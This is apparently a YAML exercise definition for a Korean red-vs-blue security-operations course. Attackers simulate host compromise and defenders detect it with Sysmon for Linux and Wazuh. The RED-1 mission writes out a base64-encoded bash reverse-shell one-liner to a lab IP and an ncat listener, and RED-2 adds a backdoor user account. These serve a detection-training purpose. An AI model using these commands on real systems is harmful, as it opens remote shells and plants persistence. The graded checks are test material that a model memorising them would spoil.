id: "secuops-w11"
category: "secuops"
title: "[보안운영 W11] 호스트 침해(리버스셸·persistence) vs sysmon-for-linux 호스트 이벤트 + Wazuh 탐지"
difficulty: "hard"
time_limit: 3300
battle_type: "1v1"
description: |
  보안운영 11주차 — **Microsoft Sysmon for Linux**(eBPF 기반)로 호스트 이벤트를 스트림으로 관측한다.
  osquery(W07)의 snapshot 과 달리 sysmon 은 **event stream**(ProcessCreate / NetworkConnect /
  FileCreate / 등 6 Event)으로 행위를 실시간 기록한다. 공격자가 base64 리버스셸·의심 프로세스·계정
  persistence 로 호스트를 침해하면, 운영자는 sysmon 을 설치·구성(config.xml RuleGroup)하고 Wazuh
  agent 로 ship 해 탐지한다.

  ▸ 모드: solo(호스트 침해 시뮬→sysmon 헌터) / duel(상대 호스트 침해→본인 sysmon/Wazuh 탐지).
  ▸ 주의: 이 6v6 에 sysmon 은 **기본 미설치** — BLUE-1 에서 설치/구성이 과제다. 탐지 채점은 침해
    아티팩트(프로세스/리스너/계정)와 Wazuh 수렴으로 한다(command_ran 불신뢰).
  ▸ 권장 마커 아티팩트: 백도어 리스너 **포트 19999**(NetworkConnect 모사), 백도어 사용자
    **eduintruder**(account persistence). osquery(snapshot) 와 sysmon(stream)의 보완 관계를 서술.

red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 18
    instruction: |
      ## 🎯 RED-1 — base64 리버스셸 / 의심 프로세스 (ProcessCreate + NetworkConnect)

      base64 로 인코딩한 명령으로 의심 프로세스를 실행하고 외부로 연결을 시도한다(리버스셸 모사).
      sysmon 의 ProcessCreate(인코딩 커맨드라인) + NetworkConnect 가 잡아야 할 행위다. 검증 가능한
      아티팩트로 **리스너 포트 19999** 를 연다.

      ### 권장 명령 (참고)
      ```bash
      echo 'bash -i >& /dev/tcp/10.20.30.202/19999 0>&1' | base64        # payload 모사
      nohup ncat -lk 19999 >/dev/null 2>&1 &                              # NetworkConnect 모사
      ```
      📌 채점: 대상 호스트에 의심 리스너(19999)가 열렸는지(sysmon NetworkConnect 표적).
      ✅ 합격: 대상 호스트에서 포트 19999 가 listening 이다.
    hint: "base64 payload + ncat -lk 19999. 채점: port_listening 19999."
    verify:
      type: "port_listening"
      expect: "19999"
      checks:
        - { id: "red-1-1", type: "port_listening", target: "web", params: { port: 19999 } }
      semantic:
        intent: "MITRE T1059/T1571 — base64 인코딩 커맨드 + 리버스셸 연결. sysmon ProcessCreate(인코딩 cmdline) + NetworkConnect 표적."
        success_criteria: ["대상 호스트에 포트 19999 listening", "(설명) base64 인코딩 커맨드와 외부 연결이 sysmon 의 어느 Event 에 걸리는지 서술"]
        acceptable_methods: ["ncat 리스너 + base64 payload 모사", "outbound 연결 시도"]
        negative_signs: ["아티팩트 미생성"]

  - order: 2
    assess_target: opponent
    target_vm: web
    points: 17
    instruction: |
      ## 🎯 RED-2 — 계정 persistence (account)

      침해 후 **백도어 계정**(eduintruder)을 만들어 지속성을 확보한다. sysmon/Wazuh 가 계정 생성·
      파일 변경을 호스트 이벤트로 관측한다.

      ### 권장 명령 (참고)
      ```bash
      sudo useradd -m -s /bin/bash eduintruder
      ```
      📌 채점: 대상 호스트의 /etc/passwd 에 백도어 사용자(eduintruder)가 추가됐는지.
      ✅ 합격: /etc/passwd 에 eduintruder 가 있다.
    hint: "useradd eduintruder. 채점: file_contains passwd eduintruder."
    verify:
      type: "file_contains"
      expect: "eduintruder"
      checks:
        - { id: "red-2-1", type: "file_contains", target: "web", params: { path: "/etc/passwd", pattern: "eduintruder" } }
      semantic:
        intent: "MITRE T1136.001 — 백도어 계정 persistence. 호스트 이벤트(파일/계정 변경)로 관측."
        success_criteria: ["/etc/passwd 에 eduintruder", "(설명) 정상 대비 식별 신호 서술"]
        acceptable_methods: ["useradd / authorized_keys(대안)"]
        negative_signs: ["흔적 미생성"]

blue_missions:
  - order: 1
    assess_target: self
    target_vm: web
    points: 12
    instruction: |
      ## 🛡️ BLUE-1 — sysmon-for-linux 설치 + config.xml RuleGroup 구성

      이 6v6 에 sysmon 은 **미설치** 상태다. sysmon-for-linux(eBPF)를 설치하고 `config.xml` 의
      RuleGroup(Include/Exclude)으로 관측할 Event(ProcessCreate / NetworkConnect / FileCreate 등)를
      정의한다. 노이즈를 줄이도록 Exclude 를 설계한다.

      ### 참고
      ```bash
      # sysmonforlinux 설치 → config.xml(ProcessCreate Include) → sysmon -accepteula -i config.xml
      ```
      📌 채점: 호스트에 Wazuh agent(sysmon 이벤트 ship 주체)가 가동 중인지(통합 전제).
      ✅ 합격: web 에 Wazuh agent 가 running 이다(sysmon→Wazuh ship 경로 준비).
    hint: "sysmon 설치 + config.xml RuleGroup(ProcessCreate Include). 통합 채점: process_running web wazuh."
    verify:
      type: "process_running"
      expect: "wazuh"
      checks:
        - { id: "blue-1-1", type: "process_running", target: "web", params: { name: "wazuh" } }
      semantic:
        intent: "sysmon 설치/구성 — eBPF 기반 6 Event. config.xml RuleGroup(Include/Exclude)로 관측 범위 + 노이즈 통제. Wazuh agent 가 ship 주체."
        success_criteria: ["(작업) sysmon 설치 + config.xml RuleGroup 구성 서술", "Wazuh agent 가동(ship 경로)", "(설명) ProcessCreate/NetworkConnect 등 6 Event 의미"]
        acceptable_methods: ["sysmonforlinux 설치 + config.xml + sysmon -i", "Wazuh localfile 연동"]
        negative_signs: ["Include 만(노이즈 폭주)", "설치/구성 미수행"]

  - order: 2
    assess_target: self
    target_vm: web
    points: 20
    instruction: |
      ## 🛡️ BLUE-2 — 의심 프로세스/리스너 탐지 (ProcessCreate + NetworkConnect)

      RED-1 의 의심 리스너(19999)/리버스셸 행위를 호스트 이벤트로 탐지한다. sysmon 이 설치됐다면
      NetworkConnect/ProcessCreate event 로, 미설치 상황에선 `ss`/osquery 로 비표준 리스너와 그
      프로세스를 상관한다.

      📌 채점: 대상 호스트에 의심 리스너(19999)가 탐지되는지.
      ✅ 합격: 포트 19999 가 listening 이며 프로세스까지 상관했다.
    hint: "ss/osquery/sysmon NetworkConnect 로 19999 + 프로세스 상관. 채점: port_listening 19999."
    verify:
      type: "port_listening"
      expect: "19999"
      checks:
        - { id: "blue-2-1", type: "port_listening", target: "web", params: { port: 19999 } }
      semantic:
        intent: "MITRE D3FEND — 호스트 이벤트 탐지. sysmon NetworkConnect(외부 연결) + ProcessCreate(인코딩 cmdline) 상관으로 리버스셸 식별."
        success_criteria: ["포트 19999 리스너 + 프로세스 상관", "(설명) sysmon event stream 이 osquery snapshot 보다 나은 점(시점/cmdline) 서술"]
        acceptable_methods: ["sysmon event / ss+osquery 로 포트+프로세스 상관"]
        negative_signs: ["포트만, 프로세스/행위 상관 누락"]

  - order: 3
    assess_target: self
    target_vm: web
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 — 계정 persistence 탐지

      RED-2 의 백도어 계정(eduintruder)을 호스트 가시화로 탐지한다. sysmon FileCreate(/etc/passwd
      변경) 또는 osquery users 로 식별한다.

      📌 채점: 대상 /etc/passwd 에 백도어 사용자(eduintruder)가 탐지되는지.
      ✅ 합격: /etc/passwd 에 eduintruder 가 있고 찾아냈다.
    hint: "sysmon FileCreate / osquery users 로 eduintruder 탐지. 채점: file_contains passwd eduintruder."
    verify:
      type: "file_contains"
      expect: "eduintruder"
      checks:
        - { id: "blue-3-1", type: "file_contains", target: "web", params: { path: "/etc/passwd", pattern: "eduintruder" } }
      semantic:
        intent: "persistence 탐지 — 계정 생성(파일 변경) 이벤트. sysmon FileCreate + Wazuh 룰 또는 osquery users."
        success_criteria: ["백도어 계정 확인", "(설명) 어떤 이벤트/쿼리로 찾았는지 서술"]
        acceptable_methods: ["sysmon FileCreate / osquery users 헌팅"]
        negative_signs: ["탐지 누락"]

  - order: 4
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-4 — Wazuh agent 통합 (sysmon 이벤트 → ossec.conf localfile → 룰)

      sysmon 이벤트를 Wazuh manager 로 ship 한다. agent 의 `ossec.conf`/`agent.conf` 의 `<localfile>`
      로 sysmon 로그를 읽어 manager 의 sysmon 룰셋이 매치하게 한다.

      📌 채점: siem 의 ossec.conf 에 localfile(로그 수집) 설정이 있는지.
      ✅ 합격: ossec.conf 에 localfile 설정이 있다.
    hint: "ossec.conf <localfile> 로 sysmon 로그 수집. 채점: file_contains ossec.conf localfile."
    verify:
      type: "file_contains"
      expect: "localfile"
      checks:
        - { id: "blue-4-1", type: "file_contains", target: "siem", params: { path: "/var/ossec/etc/ossec.conf", pattern: "localfile" } }
      semantic:
        intent: "sysmon→Wazuh 통합 — <localfile>(location/log_format)로 sysmon 이벤트 수집 + 기 활성 sysmon 룰셋 매치."
        success_criteria: ["ossec.conf 에 localfile 설정", "(설명) sysmon 로그를 어떤 log_format 으로 수집하는지 서술"]
        acceptable_methods: ["ossec.conf/agent.conf localfile 작성 + 룰 검증"]
        negative_signs: ["수집 설정 누락"]

  - order: 5
    assess_target: self
    target_vm: siem
    points: 12
    instruction: |
      ## 🛡️ BLUE-5 — R/B/P: 리버스셸 → Wazuh 탐지 수렴

      base64 리버스셸 + 계정 persistence 시나리오의 호스트 이벤트가 Wazuh 로 수렴해 경보가 뜨는지
      확인한다. 네트워크(IPS/WAF)가 못 보는 **호스트 내부 행위** 를 sysmon 이 채워 SIEM 으로 보낸다.

      📌 채점: 본인 SIEM 에 최근 경보(호스트 이벤트 포함)가 수집됐는지.
      ✅ 합격: 본인 SIEM 에 경보가 수집돼 있다.
    hint: "리버스셸/persistence 의 호스트 이벤트가 Wazuh 로 수렴 확인."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-5-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "통합 — sysmon 호스트 이벤트가 Wazuh 로 수렴. osquery(snapshot)+sysmon(stream) 보완으로 호스트 가시성 완성."
        success_criteria: ["본인 Wazuh 에 최근 경보", "(설명) osquery snapshot 과 sysmon event stream 의 보완 관계 서술"]
        acceptable_methods: ["siem wazuh_alert / 중앙 SIEM 탭"]
        negative_signs: ["수집 비어있음"]
